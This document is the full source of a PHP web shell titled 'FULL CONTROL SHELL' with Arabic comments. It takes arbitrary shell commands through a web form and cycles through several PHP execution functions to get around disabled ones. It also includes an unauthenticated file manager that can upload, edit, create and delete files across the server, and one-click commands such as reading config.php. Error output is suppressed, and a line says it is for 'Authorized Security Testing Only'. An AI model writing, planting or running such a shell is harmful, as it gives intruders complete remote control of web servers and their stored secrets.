<?php
// ======================================================
// FINAL STABLE SHELL - NO ERRORS
// Authorized Security Testing Only
// ======================================================

// إخفاء جميع الأخطاء المؤقتة للحصول على واجهة نظيفة
error_reporting(0);
ini_set('display_errors', 0);

// ========== FUNCTIONS ==========

// دالة تنفيذ الأوامر - تدعم جميع الحالات
function run($cmd) {
    $result = '';
    // تجربة جميع الطرق الممكنة
    if (function_exists('exec')) {
        @exec($cmd . " 2>&1", $output);
        $result = implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        $result = @shell_exec($cmd . " 2>&1");
    } elseif (function_exists('system')) {
        ob_start();
        @system($cmd . " 2>&1");
        $result = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . " 2>&1");
        $result = ob_get_clean();
    } elseif (function_exists('popen')) {
        $handle = @popen($cmd . " 2>&1", 'r');
        if ($handle) {
            $result = stream_get_contents($handle);
            @pclose($handle);
        }
    } else {
        $result = 'No execution function available.';
    }
    return $result ?: '(No output)';
}

// دالة الحصول على المسار الحالي
function getCurrentDir() {
    $dir = isset($_GET['dir']) ? $_GET['dir'] : '';
    if (empty($dir) || !is_dir($dir)) {
        $dir = getcwd();
        if (!$dir) $dir = dirname(__FILE__);
    }
    return rtrim($dir, '/\\');
}

// ========== VARIABLES ==========
$current_dir = getCurrentDir();
chdir($current_dir);

$message = '';
$cmd_output = '';
$cmd = '';

// ========== HANDLE COMMAND ==========
if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
    $cmd = $_POST['cmd'];
    $cmd_output = run($cmd);
}

// ========== HANDLE FILE UPLOAD ==========
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === 0) {
    $target = $current_dir . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $message = '✅ Uploaded: ' . htmlspecialchars(basename($_FILES['upload_file']['name']));
        @chmod($target, 0644);
    } else {
        $message = '❌ Upload failed. Directory not writable: ' . htmlspecialchars($current_dir);
    }
}

// ========== HANDLE DELETE FILE ==========
if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if (file_exists($file) && is_file($file) && unlink($file)) {
        $message = '✅ Deleted: ' . htmlspecialchars(basename($file));
    } else {
        $message = '❌ Cannot delete: ' . htmlspecialchars(basename($file));
    }
}

// ========== HANDLE DELETE FOLDER ==========
if (isset($_GET['del_dir'])) {
    $folder = $_GET['del_dir'];
    if (is_dir($folder) && rmdir($folder)) {
        $message = '✅ Deleted folder: ' . htmlspecialchars(basename($folder));
    } else {
        $message = '❌ Cannot delete folder (must be empty): ' . htmlspecialchars(basename($folder));
    }
}

// ========== HANDLE SAVE FILE ==========
if (isset($_POST['save_file']) && isset($_POST['file_content']) && isset($_POST['file_path'])) {
    $file_path = $_POST['file_path'];
    $content = $_POST['file_content'];
    if (file_put_contents($file_path, $content)) {
        $message = '✅ Saved: ' . htmlspecialchars(basename($file_path));
    } else {
        $message = '❌ Cannot save: ' . htmlspecialchars(basename($file_path));
    }
}

// ========== HANDLE CREATE FILE ==========
if (isset($_POST['create_file']) && isset($_POST['new_filename'])) {
    $new_file = $current_dir . '/' . trim($_POST['new_filename']);
    if (!file_exists($new_file)) {
        file_put_contents($new_file, '');
        $message = '✅ Created: ' . htmlspecialchars(trim($_POST['new_filename']));
    } else {
        $message = '❌ Already exists: ' . htmlspecialchars(trim($_POST['new_filename']));
    }
}

// ========== HANDLE CREATE FOLDER ==========
if (isset($_POST['create_folder']) && isset($_POST['new_foldername'])) {
    $new_folder = $current_dir . '/' . trim($_POST['new_foldername']);
    if (!is_dir($new_folder)) {
        mkdir($new_folder, 0777, true);
        $message = '✅ Folder created: ' . htmlspecialchars(trim($_POST['new_foldername']));
    } else {
        $message = '❌ Folder exists: ' . htmlspecialchars(trim($_POST['new_foldername']));
    }
}

// ========== GET FILE LIST ==========
$files = scandir($current_dir);
if (!$files) $files = [];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>⚡ Web Shell | Full Control</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0e1a;
            font-family: 'Segoe UI', 'Courier New', monospace;
            color: #c8d0e0;
            padding: 20px;
        }
        .main {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            background: linear-gradient(135deg, #0f121f, #0a0e1a);
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            border: 1px solid #2a3a5a;
        }
        .header h1 {
            color: #00ffcc;
            font-size: 28px;
        }
        .info {
            background: #0f121f;
            padding: 12px 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            font-size: 13px;
            border: 1px solid #2a3a5a;
        }
        .info span {
            background: #1a1e2e;
            padding: 4px 12px;
            border-radius: 20px;
        }
        .message {
            background: #1a3a2a;
            border: 1px solid #00ff88;
            color: #00ff88;
            padding: 10px 15px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .row {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        .box {
            background: #0f121f;
            border-radius: 12px;
            border: 1px solid #2a3a5a;
            flex: 1;
            min-width: 300px;
        }
        .box-title {
            background: #1a1e2e;
            padding: 12px 15px;
            border-bottom: 1px solid #2a3a5a;
            font-weight: bold;
            color: #00ffcc;
        }
        .box-body {
            padding: 15px;
        }
        input, button, textarea, select {
            background: #0a0e1a;
            border: 1px solid #2a4a6a;
            color: #c8d0e0;
            padding: 8px 12px;
            border-radius: 8px;
            font-family: monospace;
        }
        button {
            background: #1a4a6a;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover {
            background: #0a6a8a;
        }
        .terminal {
            background: #05080f;
            border-radius: 10px;
            padding: 12px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            white-space: pre-wrap;
            word-wrap: break-word;
            max-height: 400px;
            overflow: auto;
            color: #00ffaa;
            margin-top: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            text-align: left;
            padding: 8px;
            border-bottom: 1px solid #1a2a3a;
            font-size: 13px;
        }
        th {
            color: #00ffcc;
        }
        tr:hover {
            background: #1a1e2e;
        }
        a {
            color: #ffaa66;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        .folder-link {
            color: #66ffcc;
            font-weight: bold;
        }
        .btn-link {
            color: #ff6666;
            margin-left: 10px;
            font-size: 11px;
        }
        .edit-link {
            color: #66ffcc;
            margin-left: 10px;
            font-size: 11px;
        }
        .quick-btn {
            background: #1a2a3a;
            padding: 4px 10px;
            border-radius: 15px;
            font-size: 11px;
            cursor: pointer;
            display: inline-block;
        }
        .quick-btn:hover {
            background: #2a4a6a;
        }
        .flex {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 10px;
        }
        textarea {
            width: 100%;
            background: #05080f;
            color: #00ffaa;
            font-family: monospace;
            font-size: 12px;
        }
        .full-width {
            width: 100%;
        }
    </style>
</head>
<body>
<div class="main">

    <div class="header">
        <h1>⚡ FULL CONTROL SHELL</h1>
        <div style="font-size: 12px; color: #888;">Authorized Security Testing Only</div>
    </div>

    <div class="info">
        <span>📁 <?= htmlspecialchars($current_dir) ?></span>
        <span>👤 <?= run('whoami') ?></span>
        <span>🐘 PHP <?= phpversion() ?></span>
        <span>💻 <?= php_uname('s') ?></span>
    </div>

    <?php if($message): ?>
        <div class="message"><?= $message ?></div>
    <?php endif; ?>

    <div class="row">
        <!-- Command Box -->
        <div class="box">
            <div class="box-title">🖥️ COMMAND EXECUTION</div>
            <div class="box-body">
                <form method="POST">
                    <div style="display: flex; gap: 10px;">
                        <input type="text" name="cmd" placeholder="Enter any command..." style="flex: 1;" value="<?= htmlspecialchars($cmd) ?>">
                        <button type="submit">RUN</button>
                    </div>
                </form>
                <div class="terminal"><?= htmlspecialchars($cmd_output ?: '> Ready. Enter a command above.') ?></div>
                <div class="flex">
                    <span class="quick-btn" onclick="document.querySelector('input[name=cmd]').value='whoami'">whoami</span>
                    <span class="quick-btn" onclick="document.querySelector('input[name=cmd]').value='ls -la'">ls -la</span>
                    <span class="quick-btn" onclick="document.querySelector('input[name=cmd]').value='pwd'">pwd</span>
                    <span class="quick-btn" onclick="document.querySelector('input[name=cmd]').value='id'">id</span>
                    <span class="quick-btn" onclick="document.querySelector('input[name=cmd]').value='cat config.php'">cat config.php</span>
                    <span class="quick-btn" onclick="document.querySelector('input[name=cmd]').value='php -v'">php -v</span>
                </div>
            </div>
        </div>

        <!-- Upload Box -->
        <div class="box">
            <div class="box-title">📤 FILE UPLOAD</div>
            <div class="box-body">
                <form method="POST" enctype="multipart/form-data">
                    <div style="border: 2px dashed #2a4a6a; border-radius: 10px; padding: 15px; text-align: center;">
                        <input type="file" name="upload_file" style="margin-bottom: 10px;">
                        <button type="submit">UPLOAD</button>
                        <div style="font-size: 11px; color: #888; margin-top: 8px;">
                            Upload to: <?= htmlspecialchars($current_dir) ?>
                            <?= is_writable($current_dir) ? ' ✅' : ' ❌ (not writable)' ?>
                        </div>
                    </div>
                </form>
            </div>
        </div>

        <!-- Create Box -->
        <div class="box">
            <div class="box-title">➕ CREATE NEW</div>
            <div class="box-body">
                <form method="POST" style="margin-bottom: 10px;">
                    <input type="text" name="new_filename" placeholder="file.php" style="width: 140px;">
                    <button type="submit" name="create_file" value="1">Create File</button>
                </form>
                <form method="POST">
                    <input type="text" name="new_foldername" placeholder="folder_name" style="width: 140px;">
                    <button type="submit" name="create_folder" value="1">Create Folder</button>
                </form>
            </div>
        </div>
    </div>

    <!-- File Manager -->
    <div class="box" style="margin-top: 0;">
        <div class="box-title">📂 FILE MANAGER</div>
        <div class="box-body">
            <div style="margin-bottom: 15px;">
                <a href="?dir=<?= urlencode($current_dir . '/..') ?>" style="background:#1a4a6a; padding:4px 12px; border-radius:8px;">⬆ Parent</a>
                <a href="?dir=<?= urlencode($_SERVER['DOCUMENT_ROOT'] ?? '/') ?>" style="background:#1a4a6a; padding:4px 12px; border-radius:8px; margin-left:10px;">🌐 Document Root</a>
                <a href="?dir=<?= urlencode('/') ?>" style="background:#1a4a6a; padding:4px 12px; border-radius:8px; margin-left:10px;">📁 Root</a>
                <a href="?dir=<?= urlencode(getcwd()) ?>" style="background:#1a4a6a; padding:4px 12px; border-radius:8px; margin-left:10px;">🔄 Current</a>
            </div>

            <table>
                <thead>
                    <tr><th>Name</th><th>Size</th><th>Actions</th></tr>
                </thead>
                <tbody>
                    <?php foreach($files as $file):
                        if($file == '.' || $file == '..') continue;
                        $full = $current_dir . '/' . $file;
                        $isDir = is_dir($full);
                        $size = $isDir ? '-' : number_format(filesize($full)) . ' B';
                    ?>
                    <tr>
                        <td>
                            <?php if($isDir): ?>
                                📁 <a href="?dir=<?= urlencode($full) ?>" class="folder-link"><?= htmlspecialchars($file) ?></a>
                            <?php else: ?>
                                📄 <a href="?edit=<?= urlencode($full) ?>&dir=<?= urlencode($current_dir) ?>"><?= htmlspecialchars($file) ?></a>
                            <?php endif; ?>
                        </td>
                        <td><?= $size ?></td>
                        <td>
                            <?php if($isDir): ?>
                                <a href="?del_dir=<?= urlencode($full) ?>&dir=<?= urlencode($current_dir) ?>" class="btn-link" onclick="return confirm('Delete empty folder?')">🗑 Delete</a>
                            <?php else: ?>
                                <a href="?delete=<?= urlencode($full) ?>&dir=<?= urlencode($current_dir) ?>" class="btn-link" onclick="return confirm('Delete file?')">🗑 Delete</a>
                                <a href="?edit=<?= urlencode($full) ?>&dir=<?= urlencode($current_dir) ?>" class="edit-link">✏ Edit</a>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Editor -->
    <?php
    $edit_file = isset($_GET['edit']) ? $_GET['edit'] : '';
    if($edit_file && file_exists($edit_file) && is_file($edit_file)):
        $file_content = file_get_contents($edit_file);
    ?>
    <div class="box" style="margin-top: 20px;">
        <div class="box-title">✏️ EDITING: <?= htmlspecialchars(basename($edit_file)) ?></div>
        <div class="box-body">
            <form method="POST">
                <input type="hidden" name="file_path" value="<?= htmlspecialchars($edit_file) ?>">
                <textarea name="file_content" rows="20"><?= htmlspecialchars($file_content) ?></textarea>
                <div style="margin-top: 10px;">
                    <button type="submit" name="save_file" value="1">💾 SAVE</button>
                    <a href="?dir=<?= urlencode(dirname($edit_file)) ?>" style="background:#333; padding:8px 15px; border-radius:8px;">⬅ Back</a>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

</div>
</body>
</html>
